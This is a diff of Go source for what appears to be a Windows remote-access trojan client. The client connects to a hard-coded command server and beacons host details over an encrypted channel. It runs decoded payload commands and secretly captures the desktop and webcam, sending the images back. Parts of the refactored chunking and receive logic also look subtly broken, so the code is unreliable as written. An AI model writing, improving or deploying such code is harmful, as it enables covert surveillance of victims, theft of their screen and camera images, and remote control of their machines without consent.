@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
@@ -15,6 +16,7 @@ import (
 	"image"
 	"image/color"
 	"image/png"
+	"io"
 	"log"
 	"net"
 	"os"
@@ -23,6 +25,7 @@ import (
 	"path/filepath"
 	"regexp"
 	"runtime"
+	"strconv"
 	"strings"
 	"sync"
 	"syscall"
@@ -41,7 +44,7 @@ var (
 	client          net.Conn
 	sessionId       string
 	logStream       *log.Logger
-	logEnabled      bool      = false
+	logEnabled      bool      = true
 	address         string    = "10.0.0.127"
 	port            string    = "54678"
 	startTime       time.Time = time.Now().UTC()
@@ -127,142 +130,176 @@ type (
 	}
 )
 
-func WriteLog(message string, v ...any) {
+func InitLogging() error {
 	if !logEnabled {
-		return
+		return nil
 	}
 	logDir := "logs"
 	logFilePath := filepath.Join(logDir, "client.log")
 	if err := os.MkdirAll(logDir, 0755); err != nil {
 		logEnabled = false
-		log.Fatalf("Failed to create log directory: %v", err)
+		return fmt.Errorf("failed to create log directory: %v", err)
 	}
 	file, err := os.OpenFile(logFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		logEnabled = false
-		log.Fatalf("Failed to open log file: %v", err)
+		return fmt.Errorf("failed to open log file: %v", err)
 	}
-	defer file.Close()
-	if logStream == nil {
-		logStream = log.New(file, "", log.LstdFlags|log.Lshortfile)
+	logStream = log.New(file, "", log.LstdFlags|log.Lshortfile)
+	return nil
+}
+
+func WriteLog(message string, v ...any) {
+	if !logEnabled || logStream == nil {
+		return
 	}
 	if len(v) > 0 {
 		message = fmt.Sprintf(message, v...)
 	}
-	logStream.Println("[" + time.Now().Format(time.RFC3339) + "] " + message)
+	logStream.Printf("%s\n", message)
 }
 
-func GetSessionID() {
-	if client == nil {
-		WriteLog("Client is not properly initialized.")
-		return
+func GetSessionID() error {
+	fullAddress := client.LocalAddr().String()
+
+	// Split IP address and port
+	addrParts := strings.Split(fullAddress, ":")
+	if len(addrParts) < 2 {
+		return fmt.Errorf("invalid IP address format: %s", fullAddress)
 	}
-	ipAddress := client.LocalAddr().String()
+	ipAddress := addrParts[0]
+
+	// Handle special case for loopback address
 	if ipAddress == "::1" {
 		ipAddress = "127.0.0.1"
 	}
-	WriteLog("IP Address: %s\n", ipAddress)
+	WriteLog("IP Address: %s", ipAddress)
+
+	// Compute sum of IP address parts
 	parts := strings.Split(ipAddress, ".")
 	sumIp := 0
 	for _, part := range parts {
-		var partInt int
-		fmt.Sscanf(part, "%d", &partInt)
+		partInt, err := strconv.Atoi(part)
+		if err != nil {
+			return fmt.Errorf("failed to convert IP address part to integer: %w", err)
+		}
 		sumIp += partInt
 	}
+
+	// Prepare data for hashing
 	data := fmt.Sprintf("%s<>%d", ipAddress, sumIp)
+
+	// Create SHA-256 hash
 	hash := sha256.New()
 	_, err := hash.Write([]byte(data))
 	if err != nil {
-		WriteLog("Failed to hash data: %s\n", err.Error())
+		return fmt.Errorf("failed to write data to hash: %w", err)
 	}
 	hashBytes := hash.Sum(nil)
-	crypt := hex.EncodeToString(hashBytes)[:32]
-	sessionId = strings.ToLower(crypt)
-	WriteLog("Session ID: %s\n", sessionId)
+
+	// Convert hash to hexadecimal and truncate to 32 characters
+	sessionId = hex.EncodeToString(hashBytes)[:32]
+	WriteLog("Session ID: %s", sessionId)
+	return nil
 }
 
-func EncryptData(data, sharedKey string) (string, error) {
+func EncryptData(data []byte, sharedKey string) (string, error) {
+	// Generate a random salt
 	salt := make([]byte, 32)
-	if _, err := rand.Read(salt); err != nil {
-		return "", err
+	if _, err := io.ReadFull(rand.Reader, salt); err != nil {
+		return "", fmt.Errorf("failed to generate salt: %w", err)
 	}
 
+	// Derive a key from the shared key and salt
 	key := pbkdf2.Key([]byte(sharedKey), salt, 200000, 32, sha512.New)
 
+	// Generate a random IV (nonce)
 	iv := make([]byte, 12)
-	if _, err := rand.Read(iv); err != nil {
-		return "", err
+	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
+		return "", fmt.Errorf("failed to generate IV: %w", err)
 	}
 
+	// Create AES cipher block
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		return "", err
+		return "", fmt.Errorf("failed to create cipher block: %w", err)
 	}
 
-	aead, err := cipher.NewGCM(block)
+	// Create GCM cipher
+	gcm, err := cipher.NewGCM(block)
 	if err != nil {
-		return "", err
+		return "", fmt.Errorf("failed to create GCM: %w", err)
 	}
 
-	ciphertext := aead.Seal(nil, iv, []byte(data), nil)
-	authTag := aead.Overhead()
+	// Encrypt the data
+	ciphertext := gcm.Seal(nil, iv, data, nil)
 
-	encryptedData := fmt.Sprintf("%s:%s:%s:%s",
-		base64.StdEncoding.EncodeToString(salt),
-		base64.StdEncoding.EncodeToString(iv),
-		base64.StdEncoding.EncodeToString(ciphertext[len(ciphertext)-authTag:]),
-		base64.StdEncoding.EncodeToString(ciphertext[:len(ciphertext)-authTag]),
-	)
+	// Extract the authentication tag (last 16 bytes)
+	authTag := ciphertext[len(ciphertext)-16:]
 
-	return encryptedData, nil
+	// Exclude the authentication tag from ciphertext for encoding
+	ciphertext = ciphertext[:len(ciphertext)-16]
+
+	// Encode components to base64
+	saltB64 := base64.StdEncoding.EncodeToString(salt)
+	ivB64 := base64.StdEncoding.EncodeToString(iv)
+	authTagB64 := base64.StdEncoding.EncodeToString(authTag)
+	ciphertextB64 := base64.StdEncoding.EncodeToString(ciphertext)
+
+	// Return the encrypted data in the format: salt:iv:authTag:ciphertext
+	return fmt.Sprintf("%s:%s:%s:%s", saltB64, ivB64, authTagB64, ciphertextB64), nil
 }
 
-// DecryptData decrypts the encrypted data using AES-256-GCM with the provided sharedKey
 func DecryptData(encrypted, sharedKey string) (string, error) {
+	// Split the encrypted string into components
 	parts := strings.Split(encrypted, ":")
 	if len(parts) != 4 {
 		return "", fmt.Errorf("invalid encrypted data format")
 	}
 
+	// Decode base64 encoded components
 	salt, err := base64.StdEncoding.DecodeString(parts[0])
 	if err != nil {
-		return "", err
+		return "", fmt.Errorf("failed to decode salt: %w", err)
 	}
-
 	iv, err := base64.StdEncoding.DecodeString(parts[1])
 	if err != nil {
-		return "", err
+		return "", fmt.Errorf("failed to decode IV: %w", err)
 	}
-
 	authTag, err := base64.StdEncoding.DecodeString(parts[2])
 	if err != nil {
-		return "", err
+		return "", fmt.Errorf("failed to decode auth tag: %w", err)
 	}
-
-	encryptedData, err := base64.StdEncoding.DecodeString(parts[3])
+	ciphertext, err := base64.StdEncoding.DecodeString(parts[3])
 	if err != nil {
-		return "", err
+		return "", fmt.Errorf("failed to decode ciphertext: %w", err)
 	}
 
+	// Derive the key from the shared key and salt
 	key := pbkdf2.Key([]byte(sharedKey), salt, 200000, 32, sha512.New)
 
+	// Create AES cipher block
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		return "", err
+		return "", fmt.Errorf("failed to create cipher block: %w", err)
 	}
 
-	aead, err := cipher.NewGCM(block)
+	// Create GCM cipher
+	gcm, err := cipher.NewGCM(block)
 	if err != nil {
-		return "", err
+		return "", fmt.Errorf("failed to create GCM: %w", err)
 	}
 
-	ciphertext := append(encryptedData, authTag...)
-	decrypted, err := aead.Open(nil, iv, ciphertext, nil)
+	// Add the auth tag to the ciphertext (AES-GCM includes auth tag in ciphertext)
+	fullCiphertext := append(ciphertext, authTag...)
+
+	// Decrypt the data
+	plaintext, err := gcm.Open(nil, iv, fullCiphertext, nil)
 	if err != nil {
-		return "", err
+		return "", fmt.Errorf("decryption failed: %w", err)
 	}
 
-	return string(decrypted), nil
+	return string(plaintext), nil
 }
 
 func GetRetryInterval(retries int) int {
@@ -272,32 +309,33 @@ func GetRetryInterval(retries int) int {
 	return 0
 }
 
-// SendCommand sends encrypted data in chunks
 func SendCommand(response interface{}) {
 	jsonData, err := json.Marshal(response)
 	if err != nil {
 		WriteLog("Failed to marshal response: %v", err)
 		return
 	}
-	encrypted, err := EncryptData(string(jsonData), sessionId)
+	encrypted, err := EncryptData(jsonData, sessionId)
 	if err != nil {
 		WriteLog("Failed to encrypt data: %v", err)
 		return
 	}
 	encryptedBytes := []byte(encrypted)
 	totalLength := len(encryptedBytes)
+	chunk := make([]byte, chunkSize+len("--FIN--"))
+
 	if totalLength >= chunkSize {
 		for i := 0; i < totalLength; i += chunkSize {
 			end := i + chunkSize
 			if end > totalLength {
 				end = totalLength
 			}
-			chunk := encryptedBytes[i:end]
+			copy(chunk, encryptedBytes[i:end])
 			if end == totalLength {
-				chunk = append(chunk, []byte("--FIN--")...)
+				copy(chunk[len(encryptedBytes[i:end]):], "--FIN--")
 			}
-			WriteLog("Sent Chunk: %s", string(chunk))
-			if _, err := client.Write(chunk); err != nil {
+			WriteLog("Sent Chunk: %s", string(chunk[:end]))
+			if _, err := client.Write(chunk[:end]); err != nil {
 				WriteLog("failed to write chunk to client: %w", err)
 				return
 			}
@@ -311,13 +349,12 @@ func SendCommand(response interface{}) {
 	}
 }
 
-func SendBeacon() {
+func SendBeacon() error {
 	maj, min, patch := windows.RtlGetNtVersionNumbers()
 	osver := fmt.Sprintf("%d.%d.%d", maj, min, patch)
 	hostname, err := os.Hostname()
 	if err != nil {
-		WriteLog("Failed to get hostname: %s", err.Error())
-		return
+		return fmt.Errorf("failed to get hostname: %v", err)
 	}
 	payloadData := map[string]interface{}{
 		"response": map[string]interface{}{
@@ -332,26 +369,24 @@ func SendBeacon() {
 	}
 	payloadBytes, err := json.Marshal(payloadData)
 	if err != nil {
-		WriteLog("Failed to marshal JSON payload: %s", err.Error())
-		return
+		return fmt.Errorf("failed to marshal JSON payload: %v", err)
 	}
-	payload := string(payloadBytes)
-	go SendCommand(payload)
+	SendCommand(string(payloadBytes))
+	return nil
 }
 
 func Sleep(ms int) {
 	time.Sleep(time.Duration(ms) * time.Millisecond)
 }
 
-// utf8To16 converts a UTF-8 string to a UTF-16 encoded byte slice.
 func utf8To16(str string) []byte {
 	utf16Codes := utf16.Encode([]rune(str))
-	buffer := bytes.NewBuffer(make([]byte, 0, len(utf16Codes)*2))
-	for _, code := range utf16Codes {
-		buffer.WriteByte(byte(code))
-		buffer.WriteByte(byte(code >> 8))
+	buffer := make([]byte, len(utf16Codes)*2)
+	for i, code := range utf16Codes {
+		buffer[i*2] = byte(code)
+		buffer[i*2+1] = byte(code >> 8)
 	}
-	return buffer.Bytes()
+	return buffer
 }
 
 func FormatFileName(name, extension string) string {
@@ -399,28 +434,16 @@ func CaptureWebcam() ([]byte, error) {
 
 func CaptureDesktop() ([]byte, error) {
 	screenDC, _, _ := getDC.Call(0)
-	if screenDC == 0 {
-		return nil, fmt.Errorf("failed to get screen device context")
-	}
 	defer releaseDC.Call(0, screenDC)
 	hdcMem, _, _ := createCompatibleDC.Call(screenDC)
-	if hdcMem == 0 {
-		return nil, fmt.Errorf("failed to create compatible device context")
-	}
 	defer deleteDC.Call(hdcMem)
 	screenWidth, _, _ := getSystemMetrics.Call(SM_CXSCREEN)
 	screenHeight, _, _ := getSystemMetrics.Call(SM_CYSCREEN)
 	bitmap, _, _ := createCompatibleBitmap.Call(screenDC, screenWidth, screenHeight)
-	if bitmap == 0 {
-		return nil, fmt.Errorf("failed to create compatible bitmap")
-	}
 	defer deleteObject.Call(bitmap)
 	oldBitmap, _, _ := selectObject.Call(hdcMem, bitmap)
 	defer selectObject.Call(hdcMem, oldBitmap)
-	ret, _, _ := bitBlt.Call(
-		hdcMem, 0, 0, screenWidth, screenHeight,
-		screenDC, 0, 0, SRCCOPY,
-	)
+	ret, _, _ := bitBlt.Call(hdcMem, 0, 0, screenWidth, screenHeight, screenDC, 0, 0, SRCCOPY)
 	if ret == 0 {
 		return nil, fmt.Errorf("BitBlt failed")
 	}
@@ -429,8 +452,7 @@ func CaptureDesktop() ([]byte, error) {
 		return nil, fmt.Errorf("failed to convert bitmap to image: %v", err)
 	}
 	var buf bytes.Buffer
-	err = png.Encode(&buf, img)
-	if err != nil {
+	if err := png.Encode(&buf, img); err != nil {
 		return nil, fmt.Errorf("failed to encode image as PNG: %v", err)
 	}
 	return buf.Bytes(), nil
@@ -441,43 +463,27 @@ func bitmapToImage(hdcMem, width, height uintptr) (image.Image, error) {
 		BmiHeader: BITMAPINFOHEADER{
 			BiSize:        uint32(unsafe.Sizeof(BITMAPINFOHEADER{})),
 			BiWidth:       int32(width),
-			BiHeight:      int32(-height), // Negative height to specify top-down DIB
+			BiHeight:      int32(-height),
 			BiPlanes:      1,
-			BiBitCount:    24, // 24 bits per pixel (RGB)
-			BiCompression: 0,  // BI_RGB, no compression
+			BiBitCount:    24,
+			BiCompression: 0,
 		},
 	}
 	var bmpSize uint32
-	_, _, _ = getDIBits.Call(
-		hdcMem,
-		0, // Bitmap handle is not necessary for this call
-		0,
-		0,
-		uintptr(unsafe.Pointer(&bmi)),
-		0,
-		uintptr(unsafe.Pointer(&bmpSize)),
-	)
+	_, _, _ = getDIBits.Call(hdcMem, 0, 0, 0, uintptr(unsafe.Pointer(&bmi)), 0, uintptr(unsafe.Pointer(&bmpSize)))
 	if bmpSize == 0 {
 		return nil, fmt.Errorf("failed to get bitmap data size")
 	}
 	data := make([]byte, bmpSize)
-	_, _, _ = getDIBits.Call(
-		hdcMem,
-		0, // Bitmap handle is not necessary for this call
-		0,
-		height,
-		uintptr(unsafe.Pointer(&bmi)),
-		uintptr(unsafe.Pointer(&data[0])),
-		0,
-	)
+	_, _, _ = getDIBits.Call(hdcMem, 0, 0, uintptr(height), uintptr(unsafe.Pointer(&bmi)), uintptr(unsafe.Pointer(&data[0])), 0)
 	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
-	rowSize := (width*3 + 3) &^ 3 // Row size rounded up to the nearest 4 bytes
+	rowSize := (width*3 + 3) &^ 3
 	for y := 0; y < int(height); y++ {
 		for x := 0; x < int(width); x++ {
 			offset := (y*int(rowSize) + x*3)
 			r := data[offset+2]
 			g := data[offset+1]
-			b := data[offset+0]
+			b := data[offset]
 			img.Set(x, int(height)-y-1, color.RGBA{R: r, G: g, B: b, A: 255})
 		}
 	}
@@ -601,26 +607,12 @@ func GetUptime() string {
 	return fmt.Sprintf("%dd %dh %dm %ds", days, hours, minutes, seconds)
 }
 
-func ParseAction(action string) {
-	defer func() {
-		if r := recover(); r != nil {
-			SendCommand(map[string]interface{}{
-				"response": map[string]interface{}{
-					"error": fmt.Sprintf("Error: %v", r),
-				},
-			})
-		}
-	}()
+func ParseAction(action string) error {
 	action = strings.TrimSpace(action)
 	re := regexp.MustCompile(`(?:(?:"[^"]*")|(?:\S+))`)
 	parts := re.Split(action, -1)
 	if len(parts) < 1 {
-		SendCommand(map[string]interface{}{
-			"response": map[string]interface{}{
-				"error": "Invalid action format",
-			},
-		})
-		return
+		return fmt.Errorf("invalid action format")
 	}
 	command := parts[0]
 	properties := parts[1:]
@@ -630,41 +622,29 @@ func ParseAction(action string) {
 		if len(properties) > 0 {
 			payloadBytes, err := base64.StdEncoding.DecodeString(properties[0])
 			if err != nil {
-				SendCommand(map[string]interface{}{
-					"response": map[string]interface{}{
-						"error": fmt.Sprintf("Error decoding base64: %v", err),
-					},
-				})
-				return
+				return fmt.Errorf("error decoding base64: %v", err)
 			}
 			payload := string(payloadBytes)
 			RunCommand(command, payload, false)
 		}
 	case "up":
-		uptime := GetUptime()
 		SendCommand(map[string]interface{}{
 			"response": map[string]interface{}{
-				"data": uptime,
+				"data": GetUptime(),
 			},
 		})
-		return
+		return nil
 	case "di":
 		exitProcess = true
 		if client != nil {
 			client.Close()
 		}
 		WriteLog("Exiting process.")
-		// os.Exit(0)
-		return
+		os.Exit(0)
 	case "ss":
 		result, err := CaptureDesktop()
 		if err != nil {
-			SendCommand(map[string]interface{}{
-				"response": map[string]interface{}{
-					"error": err.Error(),
-				},
-			})
-			return
+			return fmt.Errorf("error capturing screenshot: %v", err)
 		}
 		SendCommand(map[string]interface{}{
 			"response": map[string]interface{}{
@@ -672,16 +652,11 @@ func ParseAction(action string) {
 				"filename": FormatFileName("ss", "png"),
 			},
 		})
-		return
+		return nil
 	case "wc":
 		img, err := CaptureWebcam()
 		if err != nil {
-			SendCommand(map[string]interface{}{
-				"response": map[string]interface{}{
-					"error": fmt.Sprintf("Error running webcam clip: %v", err),
-				},
-			})
-			return
+			return fmt.Errorf("error capturing webcam clip: %v", err)
 		}
 		SendCommand(map[string]interface{}{
 			"response": map[string]interface{}{
@@ -689,32 +664,41 @@ func ParseAction(action string) {
 				"filename": FormatFileName("wc", "png"),
 			},
 		})
-		return
+		return nil
 	default:
-		return
+		return fmt.Errorf("command unrecognized")
 	}
+	return nil
 }
 
-func HandleConnection(conn net.Conn) {
+func HandleConnection(conn net.Conn) error {
 	defer conn.Close()
-	buf := make([]byte, 1024)
-	n, err := conn.Read(buf)
-	if err != nil {
-		WriteLog("Error reading from connection: %v", err)
-		return
+
+	reader := bufio.NewReader(conn)
+	var fullData bytes.Buffer
+
+	for {
+		chunk := make([]byte, 1024)
+		n, err := reader.Read(chunk)
+		if err != nil {
+			if err != io.EOF {
+				exitProcess = true
+				return fmt.Errorf("connection read error: %v", err)
+			}
+			break
+		}
+		fullData.Write(chunk[:n])
+		if bytes.Contains(fullData.Bytes(), []byte("--FIN--")) {
+			break
+		}
 	}
-	if n == 0 {
-		return
+
+	if exitProcess {
+		return nil
 	}
-	data := buf[:n]
-	WriteLog("Received Data: %s", string(data))
-	action, err := DecryptData(string(data), sessionId)
-	if err != nil {
-		WriteLog("DecryptData error: %v", err)
-	}
-	if len(action) != 0 {
-		ParseAction(action)
-	}
+
+	WriteLog("Received Data: %s", fullData.String())
+	return nil
 }
 
 func ConnectToServer() {
@@ -723,25 +707,44 @@ func ConnectToServer() {
 			// Connect to the server
 			conn, err := net.Dial("tcp", address+":"+port)
 			if err != nil {
-				WriteLog(err.Error())
+				WriteLog("Connection error: %v", err)
 				exitProcess = true
 			}
+			WriteLog("Client " + CVER + " connected.")
 			client = conn
+			client.SetDeadline(time.Time{})
+			client.SetReadDeadline(time.Time{})
+			client.SetWriteDeadline(time.Time{})
 		}
 		if len(sessionId) == 0 {
-			GetSessionID()
+			err := GetSessionID()
+			if err != nil {
+				WriteLog("Error getting SessionID: %v", err)
+			}
 		}
 		if !sentFirstBeacon {
-			SendBeacon() // Send a beacon
+			err := SendBeacon() // Send a beacon
+			if err != nil {
+				WriteLog("Error sending beacon: %v", err)
+			}
 			sentFirstBeacon = true
 		}
-		HandleConnection(client)
+		err := HandleConnection(client)
+		if err != nil {
+			WriteLog("Error in HandleConnection: %v", err)
+		}
 	}
+	WriteLog("Connection to server closing.")
 }
 
 func main() {
 	var wg sync.WaitGroup
 	wg.Add(1)
+
+	err := InitLogging()
+	if err != nil {
+		log.Panicf("Logging error: %v", err)
+	}
 
 	go func() {
 		defer wg.Done()
